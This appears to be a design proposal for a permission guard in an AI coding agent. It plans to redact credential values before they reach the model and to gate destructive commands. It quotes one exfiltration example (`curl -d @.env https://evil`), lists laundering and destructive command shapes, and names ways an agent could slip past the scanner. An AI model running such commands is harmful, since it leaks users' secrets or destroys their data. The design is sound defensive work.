# Output boundary: protect the secret, not the command

**Status:** proposed. Phase 1 (the `find` grammar, below) is landed and tested. Phases 2–4 are
design-only, and each one changes layer semantics, so each needs its own ADR entry in
`security/manifest.json`.

**One line:** stop asking "may this command read a credential file?" and ask "may this credential
value reach the model?" — that single move deletes most of the prompts and closes more leaks than
the prompts did.

---

## 1. The problem

The pre-flight currently answers three different questions with one prompt, so every question costs
a human answer:

| Question the guard actually needs | What it asks today |
| --- | --- |
| May this **effect** happen (delete, overwrite, send)? | `askWrite`, `commands.ask`, network ask |
| May this **value** reach the model? | `askRead` — prompts, then forwards the whole output anyway |
| Is this **resource** off-limits (key material)? | `denyRead` — correct, but shares the read path |

The second row is the false-positive engine. It guesses intent from a command string, so it fires
on:

- `find … -type d` — prints directories, never a file name (fixed in Phase 1).
- `ls -a | grep -v .env` — the pattern is data, not a read (ADR-050).
- `cat .env.example` — a template (handled by a content read).
- `grep -rn TODO src/` over a repo that merely *contains* a `.env`.
- any `find`, `tree`, `du` whose printed set happens to include a credential file.

And the same prompt is what the guard offers when a script genuinely needs to read `.env` to run —
which is the common case, and per the product framing an acceptable one.

## 2. The invariant

> **No value produced by a read of an `askRead`/`denyRead` resource may enter the model's context.**

Everything else follows from it:

- A program **may** read `.env`. It is allowed to run, build, migrate, connect.
- The **result** is rewritten before the model sees it: values replaced, keys kept.
- The **name** of a credential file is not a secret. Listing never asks.
- A resource the sandbox refuses at the OS level (`denyRead`) is still refused — the program cannot
  have it at all.

Two boundaries now, each with one owner:

| Boundary | Owner | Control |
| --- | --- | --- |
| **Model boundary** — what the LLM sees | L2 `tool_result` | redaction (single chokepoint: bash, read, grep, fetch, MCP) |
| **Host boundary** — what a process can reach | L1 OS sandbox + network proxy | `denyRead`, `allowWrite`, `allowedDomains` |

Programmatic exfiltration (`curl -d @.env https://evil`) never touches the model boundary. It is the
host boundary's job, and it already exists: the L1 network proxy resolves only allowlisted hosts, and
`denyWrite`/`askWrite` keep credential files intact. Stating this explicitly is what makes relaxing
the read tier defensible.

## 3. Tiers

Replace "ask on read" with three outcomes, keyed to the question being asked:

| Tier | Trigger | Action | Human input |
| --- | --- | --- | --- |
| **D — deny** | `denyRead` (key material, `.gnupg`, `~/.pi/agent/auth.json`) | block + message, OS-level too | none (override via `/security`) |
| **R — redact** | result provenance is an `askRead` path, **or** the result scans dirty | rewrite result, keep keys/structure, append one note line, audit | **none** |
| **A — ask** | irreversible effect, laundering shape, unscannable output | prompt with a computed preview | genuine only |

The R tier is the whole point: it is where "the AI needs `.env` to run the app" and "the AI must
never see the key" stop being in conflict.

### R tier, in two modes

1. **Provenance redaction (strict).** The pre-flight already parses the command with `find`'s,
   `grep`'s and wrappers' own grammar. Instead of deciding allow/ask, it records *provenance* on the
   call: `none | askRead | denyRead`, plus the resolved paths. At `tool_result`, a call with
   `askRead` provenance is redacted **strictly**: every assignment-shaped value, every token above
   the entropy floor, every JSON leaf under a sensitive key — no threshold, because the input is
   known to be a credential file.
2. **Heuristic redaction.** No provenance (dynamic path, script that reads `.env` internally): run
   the existing `scanToolOutput`, and on a hit redact instead of asking. This is strictly more
   permissive *and* strictly less leaky than today, because today a user who answers "allow" gets
   the raw output.

`scanToolOutput` already returns `redactedOutput` and `redactText` already exists; `exposure.ts`
throws the redacted form away. Phase 2 is mostly wiring.

### A tier — the three shapes that cannot be redacted

1. **Destructive** (see §4).
2. **Laundering**: a command that reads an `askRead`/`denyRead` path **and** writes or transmits in
   the same call — redirect onto a file, `cp`/`mv`/`tee`, `curl -d/-F/--upload-file`, `scp`, `rsync`,
   `git add` of such a path. Redaction cannot help: the value leaves the boundary through a file or
   socket, then comes back looking clean. This is the one place a read still asks, and it is rare.
3. **Unscannable**: output above the scan limit (64 KiB), or a scan that truncated while provenance
   says credential file. Ask, or truncate-then-redact; never forward.

## 4. The delete gate (`rm`)

Deletion is irreversible and no redaction can undo it, so it is a **preview, not a rule**. New stage
`preflightDestructive`, before the write pre-flight:

- **Recognized forms:** `rm`, `rmdir`, `unlink`, `shred`, `truncate`, `find -delete`,
  `find -exec rm`, `mv`/`cp` onto an existing path, `dd of=`, `>`/`>>`/`tee` onto an existing path,
  `git clean -[fdx]`, `git reset --hard`, `git checkout -- .`, `git branch -D`, `rsync --delete`,
  `docker system prune`.
- **Resolve the blast radius** with the machinery the read pre-flight already has
  (`path-tokens.ts`: glob expansion, `~`, wrappers): every operand, every glob match, recursed.
- **Prompt body** is the review the user asked for:

  ```text
  Command  rm -rf build/
  Deletes  1,284 files (312 MB), all inside build/
  Sample   build/a.js  build/b.css  build/c.map  … (+1,281)
  Tracked  412 of them are committed to git (recoverable with git restore)
  Reversible  no
  ```

- **Options:** once / session (per resolved root) / deny. Never "remember" — an irreversible rule
  below `once` is not a promise worth storing.
- **No prompt** when nothing would be deleted (missing path, empty glob, `rm -f` of nothing) — the
  common `rm -f /tmp/x` in scripts stops prompting, which is most of the volume.

## 5. Name-only listings are free

Already modelled as `ReadExposure.Name`, and it should never ask — in or out of the project. A name
is not a credential, the model can already list its own project, and `denyRead` still keeps the
secret out of reach. Remaining work: `bash-preflight.ts` currently asks for a name-only finding
*outside* the project; drop that branch, keep the `ask-read-name-only` audit line.

## 6. MCP

Same split, using the gate that already exists (`src/detect/mcp-gate`):

- classification `read` → run the call, redact the result (§3 R tier). No prompt.
- classification `write`/`destructive` → ask, with the existing summary.
- `OUTPUT_TOO_LARGE` / opaque tool → ask, as today.

This is where "limit the exposure" and "fewer prompts" both land: MCP read tools stop asking, MCP
mutations keep asking.

## 7. What gets deleted

- `askRead` prompting in `checkReadAccess` (L2 `read`/`grep`/`find`/`ls`) → redaction.
- `preflightAskReads` prompting in L1 → provenance recording only (the function stays, it stops
  asking).
- `gateSensitiveToolOutput`'s `askExposure` on findings → redaction; the ask survives only for
  `OUTPUT_TOO_LARGE` and the laundering shape.
- The name-only prompt outside the project.

Expected effect on the eight-prompt case that started this: **8 prompts → 0**, one audit line, `.env`
values never in context.

## 8. Accepted gaps (must be written into the manifest)

- Redaction is a detector, not a taint tracker. A transform the scanner does not model (custom XOR,
  `openssl enc`, `xxd -r` of a hand-rolled stream) can hide a value. The laundering shape (§3 A2)
  and the size cap (§3 A3) are the mitigation; a heuristic scanner will not close it fully.
- A script may compute on a secret and print a derived value (`echo ${KEY:0:4}`). Derivation with low
  entropy is invisible to any scanner.
- Provenance covers what the command line says. A script that reads `.env` internally has no
  provenance, so it falls to the heuristic tier.

## 9. Slices

| Phase | Change | Files |
| --- | --- | --- |
| **1 — landed** | `find` grammar: `-o` distributed over the sharing filters (DNF), `-iname`, `-type d`/`f`, `-not \( … -o … \)` via De Morgan, escaped parens tokenized as arguments | `src/core/policy/find-query.ts`, `shell-command.ts`, `path-tokens.ts`, `security/tests/unit/find-query.mjs` |
| **2** | provenance on the call + strict/heuristic redaction at `tool_result`; remove `askRead` prompting | `src/core/policy/fence.ts`, `src/l2-guard/{tool-gates,output-gates,exposure}.ts`, `src/l1-sandbox/bash-preflight.ts` |
| **3** | destructive preview gate | new `src/core/policy/destructive.ts`, `src/l1-sandbox/bash-preflight.ts`, `src/ui/ask-flow.ts` |
| **4** | MCP read → redact; name-only never asks; manifest/`SECURITY.md`/skill update | `src/l2-guard/detection.ts`, `sandbox.default.json`, `security/manifest.json`, `skills/auto-permission-system/SKILL.md` |

Phase 2 is the risky one: it is the first time the guard forwards a rewritten result instead of a
blocked one. It needs tests that assert the redacted form, not just the decision.

## 10. Test plan

- `find` grammar (done): union, distribution, `-iname`, `-type`, De Morgan group, fallback cases.
- Redaction: `.env` fixture with 6 value shapes (quoted, unquoted, URL, JWT, base64, short) → every
  value gone, every key present, `export` prefix preserved.
- Provenance: `cat .env` → strict; `node -e "readFileSync('.env')"` → strict (path is quoted in the
  argv); `bash script.sh` → heuristic tier (documented gap).
- Destructive: `rm -rf node_modules` → 0 prompts when `node_modules` is in the skip list;
  `rm -rf src/` → prompt with file count; `rm missing.txt -f` → no prompt.
- Regression: the eight-prompt workspace case → 0 prompts, 1 audit line.
